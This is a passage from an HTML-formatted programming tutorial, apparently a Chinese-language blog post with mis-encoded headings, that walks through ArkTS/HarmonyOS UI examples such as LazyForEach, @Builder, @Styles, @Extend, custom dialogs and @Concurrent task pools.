      <span class="hljs-title class_">GridItem</span>() { <span class="hljs-title class_">Text</span>(<span class="hljs-string">'2'</span>) }
      <span class="hljs-title class_">GridItem</span>() { <span class="hljs-title class_">Text</span>(<span class="hljs-string">'3'</span>) }
    }
    .<span class="hljs-title function_">columnsTemplate</span>(<span class="hljs-string">'1fr 1fr 1fr'</span>)
    .<span class="hljs-title function_">rowsTemplate</span>(<span class="hljs-string">'1fr 1fr'</span>)
  }
}
</code></pre>
<h4 data-id="heading-52">åŸºç¡€ç»„ä»¶</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">BasicComponents</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">inputValue</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">''</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">isChecked</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">sliderValue</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">50</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">15</span> }) {
      <span class="hljs-comment">// Textç»„ä»¶</span>
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Hello HarmonyOS'</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">24</span>)
        .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Blue</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
      
      <span class="hljs-comment">// Buttonç»„ä»¶</span>
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Click Me'</span>)
        .<span class="hljs-title function_">type</span>(<span class="hljs-title class_">ButtonType</span>.<span class="hljs-property">Capsule</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">200</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">'Button clicked'</span>);
        })
      
      <span class="hljs-comment">// Imageç»„ä»¶</span>
      <span class="hljs-title class_">Image</span>($r(<span class="hljs-string">'app.media.icon'</span>))
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
        .<span class="hljs-title function_">height</span>(<span class="hljs-number">100</span>)
        .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">50</span>)
      
      <span class="hljs-comment">// TextInputç»„ä»¶</span>
      <span class="hljs-title class_">TextInput</span>({ <span class="hljs-attr">placeholder</span>: <span class="hljs-string">'Enter text'</span> })
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'90%'</span>)
        .<span class="hljs-title function_">onChange</span>(<span class="hljs-function">(<span class="hljs-params">value: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">inputValue</span> = value;
        })
      
      <span class="hljs-comment">// Checkboxç»„ä»¶</span>
      <span class="hljs-title class_">Checkbox</span>()
        .<span class="hljs-title function_">select</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">isChecked</span>)
        .<span class="hljs-title function_">onChange</span>(<span class="hljs-function">(<span class="hljs-params">value: <span class="hljs-built_in">boolean</span></span>) =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">isChecked</span> = value;
        })
      
      <span class="hljs-comment">// Sliderç»„ä»¶</span>
      <span class="hljs-title class_">Slider</span>({
        <span class="hljs-attr">value</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderValue</span>,
        <span class="hljs-attr">min</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">max</span>: <span class="hljs-number">100</span>,
        <span class="hljs-attr">step</span>: <span class="hljs-number">1</span>
      })
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'90%'</span>)
        .<span class="hljs-title function_">onChange</span>(<span class="hljs-function">(<span class="hljs-params">value: <span class="hljs-built_in">number</span></span>) =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderValue</span> = value;
        })
      
      <span class="hljs-comment">// Progressç»„ä»¶</span>
      <span class="hljs-title class_">Progress</span>({ <span class="hljs-attr">value</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderValue</span>, <span class="hljs-attr">total</span>: <span class="hljs-number">100</span> })
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'90%'</span>)
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">padding</span>(<span class="hljs-number">20</span>)
  }
}
</code></pre>
<h3 data-id="heading-53">5. æ¡ä»¶æ¸²æŸ“å’Œå¾ªç¯æ¸²æŸ“</h3>
<h4 data-id="heading-54">if/else æ¡ä»¶æ¸²æŸ“</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ConditionalRender</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">isLoggedIn</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">userType</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'guest'</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-comment">// ifæ¡ä»¶æ¸²æŸ“</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isLoggedIn</span>) {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Welcome back!'</span>)
          .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">20</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Please login'</span>)
          .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">16</span>)
      }
      
      <span class="hljs-comment">// if-else if-else</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">userType</span> === <span class="hljs-string">'admin'</span>) {
        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Admin Panel'</span>)
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">userType</span> === <span class="hljs-string">'user'</span>) {
        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'User Dashboard'</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Guest Mode'</span>)
      }
      
      <span class="hljs-comment">// ä¸‰å…ƒè¡¨è¾¾å¼</span>
      <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">isLoggedIn</span> ? <span class="hljs-string">'Online'</span> : <span class="hljs-string">'Offline'</span>)
        .<span class="hljs-title function_">fontColor</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">isLoggedIn</span> ? <span class="hljs-title class_">Color</span>.<span class="hljs-property">Green</span> : <span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span>)
    }
  }
}
</code></pre>
<h4 data-id="heading-55">ForEach å¾ªç¯æ¸²æŸ“</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ListExample</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">items</span>: <span class="hljs-built_in">string</span>[] = [<span class="hljs-string">'Apple'</span>, <span class="hljs-string">'Banana'</span>, <span class="hljs-string">'Orange'</span>, <span class="hljs-string">'Grape'</span>];
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-comment">// ForEachå¾ªç¯æ¸²æŸ“</span>
      <span class="hljs-title class_">ForEach</span>(
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>,                    <span class="hljs-comment">// æ•°æ®æº</span>
        <span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">string</span>, index: <span class="hljs-built_in">number</span></span>) =&gt;</span> {  <span class="hljs-comment">// æ¸²æŸ“å‡½æ•°</span>
          <span class="hljs-title class_">Row</span>() {
            <span class="hljs-title class_">Text</span>(<span class="hljs-string">`<span class="hljs-subst">${index + <span class="hljs-number">1</span>}</span>. <span class="hljs-subst">${item}</span>`</span>)
              .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">18</span>)
          }
          .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
          .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
          .<span class="hljs-title function_">padding</span>(<span class="hljs-number">10</span>)
        },
        <span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">string</span></span>) =&gt;</span> item         <span class="hljs-comment">// é”®ç”Ÿæˆå‡½æ•°ï¼ˆå¯é€‰ï¼‰</span>
      )
    }
  }
}
</code></pre>
<h4 data-id="heading-56">LazyForEach æ‡’åŠ è½½åˆ—è¡¨</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®ç°IDataSourceæ¥å£</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDataSource</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IDataSource</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">list</span>: <span class="hljs-built_in">string</span>[] = [];
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">list: <span class="hljs-built_in">string</span>[]</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span> = list;
  }
  
  <span class="hljs-title function_">totalCount</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-property">length</span>;
  }
  
  <span class="hljs-title function_">getData</span>(<span class="hljs-attr">index</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>[index];
  }
  
  <span class="hljs-title function_">registerDataChangeListener</span>(<span class="hljs-attr">listener</span>: <span class="hljs-title class_">DataChangeListener</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-comment">// æ³¨å†Œç›‘å¬å™¨</span>
  }
  
  <span class="hljs-title function_">unregisterDataChangeListener</span>(<span class="hljs-attr">listener</span>: <span class="hljs-title class_">DataChangeListener</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-comment">// æ³¨é”€ç›‘å¬å™¨</span>
  }
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">LazyListExample</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">data</span>: <span class="hljs-title class_">MyDataSource</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDataSource</span>(
    <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">1000</span> }, <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> <span class="hljs-string">`Item <span class="hljs-subst">${i}</span>`</span>)
  );
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">List</span>() {
      <span class="hljs-comment">// LazyForEachå®ç°æ‡’åŠ è½½ï¼Œåªæ¸²æŸ“å¯è§åŒºåŸŸ</span>
      <span class="hljs-title class_">LazyForEach</span>(
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>,
        <span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
          <span class="hljs-title class_">ListItem</span>() {
            <span class="hljs-title class_">Text</span>(item)
              .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
              .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
          }
        },
        <span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">string</span></span>) =&gt;</span> item
      )
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
  }
}
</code></pre>
<h3 data-id="heading-57">6. @Builder è‡ªå®šä¹‰æ„å»ºå‡½æ•°</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">BuilderExample</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-comment">// @Builderè£…é¥°çš„å‡½æ•°å¯ä»¥å¤ç”¨UIç»“æ„</span>
  <span class="hljs-meta">@Builder</span> <span class="hljs-title class_">CustomButton</span>(<span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">action</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>) {
    <span class="hljs-title class_">Button</span>(text)
      .<span class="hljs-title function_">width</span>(<span class="hljs-number">150</span>)
      .<span class="hljs-title function_">height</span>(<span class="hljs-number">40</span>)
      .<span class="hljs-title function_">onClick</span>(action)
  }
  
  <span class="hljs-comment">// å…¨å±€@Builderï¼ˆåœ¨structå¤–éƒ¨ï¼‰</span>
  <span class="hljs-meta">@Builder</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">GlobalHeader</span>(<span class="hljs-params">title: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-title class_">Row</span>() {
      <span class="hljs-title class_">Text</span>(title)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">24</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-number">60</span>)
    .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#f0f0f0'</span>)
  }
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-title class_">GlobalHeader</span>(<span class="hljs-string">'My Page'</span>)
      
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Count: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.count}</span>`</span>)
      
      <span class="hljs-comment">// å¤ç”¨è‡ªå®šä¹‰æ„å»ºå‡½æ•°</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">CustomButton</span>(<span class="hljs-string">'Increase'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++;
      })
      
      <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">CustomButton</span>(<span class="hljs-string">'Decrease'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>--;
      })
      
      <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">CustomButton</span>(<span class="hljs-string">'Reset'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> = <span class="hljs-number">0</span>;
      })
    }
  }
}
</code></pre>
<h3 data-id="heading-58">7. @Styles æ ·å¼å¤ç”¨</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å…¨å±€@Styles</span>
<span class="hljs-meta">@Styles</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">globalFancyText</span>(<span class="hljs-params"/>) {
  .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">20</span>)
  .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Blue</span>)
  .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
}

<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">StylesExample</span> {
  <span class="hljs-comment">// ç»„ä»¶å†…@Styles</span>
  <span class="hljs-meta">@Styles</span> <span class="hljs-title function_">fancyButton</span>(<span class="hljs-params"/>) {
    .<span class="hljs-title function_">width</span>(<span class="hljs-number">200</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
    .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Orange</span>)
    .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">25</span>)
  }
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-comment">// ä½¿ç”¨å…¨å±€æ ·å¼</span>
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Global Style'</span>)
        .<span class="hljs-title function_">globalFancyText</span>()
      
      <span class="hljs-comment">// ä½¿ç”¨ç»„ä»¶æ ·å¼</span>
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Fancy Button'</span>)
        .<span class="hljs-title function_">fancyButton</span>()
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Another Fancy Button'</span>)
        .<span class="hljs-title function_">fancyButton</span>()
    }
  }
}
</code></pre>
<h3 data-id="heading-59">8. @Extend æ‰©å±•ç»„ä»¶æ ·å¼</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// @Extendåªèƒ½ç”¨äºæ‰©å±•å†…ç½®ç»„ä»¶</span>
<span class="hljs-meta">@Extend</span>(<span class="hljs-title class_">Text</span>) <span class="hljs-keyword">function</span> <span class="hljs-title function_">fancyText</span>(<span class="hljs-params">fontSize: <span class="hljs-built_in">number</span>, color: Color</span>) {
  .<span class="hljs-title function_">fontSize</span>(fontSize)
  .<span class="hljs-title function_">fontColor</span>(color)
  .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
  .<span class="hljs-title function_">textAlign</span>(<span class="hljs-title class_">TextAlign</span>.<span class="hljs-property">Center</span>)
  .<span class="hljs-title function_">padding</span>(<span class="hljs-number">10</span>)
  .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#f5f5f5'</span>)
  .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">8</span>)
}

<span class="hljs-meta">@Extend</span>(<span class="hljs-title class_">Button</span>) <span class="hljs-keyword">function</span> <span class="hljs-title function_">primaryButton</span>(<span class="hljs-params"/>) {
  .<span class="hljs-title function_">width</span>(<span class="hljs-number">200</span>)
  .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
  .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Blue</span>)
  .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">White</span>)
  .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">25</span>)
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ExtendExample</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-comment">// ä½¿ç”¨æ‰©å±•æ ·å¼</span>
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Extended Text'</span>)
        .<span class="hljs-title function_">fancyText</span>(<span class="hljs-number">18</span>, <span class="hljs-title class_">Color</span>.<span class="hljs-property">Red</span>)
      
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Another Text'</span>)
        .<span class="hljs-title function_">fancyText</span>(<span class="hljs-number">16</span>, <span class="hljs-title class_">Color</span>.<span class="hljs-property">Green</span>)
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Primary Action'</span>)
        .<span class="hljs-title function_">primaryButton</span>()
    }
  }
}
</code></pre>
<h3 data-id="heading-60">9. @CustomDialog è‡ªå®šä¹‰å¼¹çª—</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@CustomDialog</span>
struct <span class="hljs-title class_">CustomDialogExample</span> {
  <span class="hljs-attr">controller</span>: <span class="hljs-title class_">CustomDialogController</span>;
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'Dialog Title'</span>;
  <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'Dialog message'</span>;
  <span class="hljs-attr">confirm</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">title</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">20</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
      
      <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">16</span>)
      
      <span class="hljs-title class_">Row</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Cancel'</span>)
          .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">controller</span>.<span class="hljs-title function_">close</span>();
          })
        
        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Confirm'</span>)
          .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">confirm</span>();
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">controller</span>.<span class="hljs-title function_">close</span>();
          })
      }
    }
    .<span class="hljs-title function_">padding</span>(<span class="hljs-number">20</span>)
  }
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">DialogPage</span> {
  <span class="hljs-attr">dialogController</span>: <span class="hljs-title class_">CustomDialogController</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomDialogController</span>({
    <span class="hljs-attr">builder</span>: <span class="hljs-title class_">CustomDialogExample</span>({
      <span class="hljs-attr">title</span>: <span class="hljs-string">'Delete Confirmation'</span>,
      <span class="hljs-attr">message</span>: <span class="hljs-string">'Are you sure you want to delete this item?'</span>,
      <span class="hljs-attr">confirm</span>: <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">'Item deleted'</span>);
      }
    }),
    <span class="hljs-attr">autoCancel</span>: <span class="hljs-literal">true</span>
  });
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Show Dialog'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">dialogController</span>.<span class="hljs-title function_">open</span>();
        })
    }
  }
}
</code></pre>
<h3 data-id="heading-61">10. @AnimatableExtend å¯åŠ¨ç”»å±æ€§æ‰©å±•</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@AnimatableExtend</span>(<span class="hljs-title class_">Text</span>) <span class="hljs-keyword">function</span> <span class="hljs-title function_">animatableFontSize</span>(<span class="hljs-params">size: <span class="hljs-built_in">number</span></span>) {
  .<span class="hljs-title function_">fontSize</span>(size)
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">AnimationExample</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">fontSize</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">20</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Animated Text'</span>)
        .<span class="hljs-title function_">animatableFontSize</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">fontSize</span>)
        .<span class="hljs-title function_">animation</span>({
          <span class="hljs-attr">duration</span>: <span class="hljs-number">500</span>,
          <span class="hljs-attr">curve</span>: <span class="hljs-title class_">Curve</span>.<span class="hljs-property">EaseInOut</span>
        })
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Increase Font'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">fontSize</span> += <span class="hljs-number">5</span>;
        })
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Decrease Font'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">fontSize</span> -= <span class="hljs-number">5</span>;
        })
    }
  }
}
</code></pre>
<h3 data-id="heading-62">11. @Concurrent å¹¶å‘è£…é¥°å™¨</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// @Concurrentç”¨äºæ ‡è®°å¯ä»¥å¹¶å‘æ‰§è¡Œçš„å‡½æ•°</span>
<span class="hljs-meta">@Concurrent</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">heavyComputation</span>(<span class="hljs-params">data: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-comment">// è€—æ—¶è®¡ç®—</span>
  <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; data.<span class="hljs-property">length</span>; i++) {
    sum += data[i] * data[i];
  }
  <span class="hljs-keyword">return</span> sum;
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ConcurrentExample</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">result</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">loading</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;
  
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">performHeavyTask</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">1000000</span> }, <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> i);
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// åœ¨å­çº¿ç¨‹ä¸­æ‰§è¡Œ</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">result</span> = <span class="hljs-keyword">await</span> taskpool.<span class="hljs-title function_">execute</span>(heavyComputation, data);
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Task failed:'</span>, error);
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> = <span class="hljs-literal">false</span>;
    }
  }
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span>) {
        <span class="hljs-title class_">LoadingProgress</span>()
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Result: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.result}</span>`</span>)
      }
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Start Heavy Task'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">performHeavyTask</span>();
        })
    }
  }
}
</code></pre>
<h3 data-id="heading-63">12. @Reusable ç»„ä»¶å¤ç”¨</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
